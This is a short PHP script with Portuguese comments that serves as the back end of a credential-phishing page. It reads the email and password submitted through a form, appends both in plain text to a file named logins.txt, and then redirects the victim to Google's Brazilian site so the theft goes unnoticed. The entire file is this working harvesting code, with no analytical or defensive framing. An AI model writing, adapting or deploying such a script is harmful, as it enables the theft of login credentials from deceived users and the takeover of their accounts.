<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Obtendo os valores do formulário
  $email = $_POST["email"];
  $senha = $_POST["password"];

  // Salvando os dados em um arquivo de texto
  $dados = "Email ou Senha: " . $email . " - Senha: " . $senha . "\n";

  // Nome do arquivo onde os dados serão salvos
  $nomeArquivo = "logins.txt";

  // Abre o arquivo em modo de escrita (append - acrescentar) e adiciona os dados
  $arquivo = fopen($nomeArquivo, "a");

  // Escreve os dados no arquivo
  fwrite($arquivo, $dados);

  // Fecha o arquivo
  fclose($arquivo);

  // Redireciona para https://www.google.com.br após salvar os dados
  header("Location: https://www.google.com.br");
  exit; // Certifica-se de que o script seja encerrado após o redirecionamento
}
?>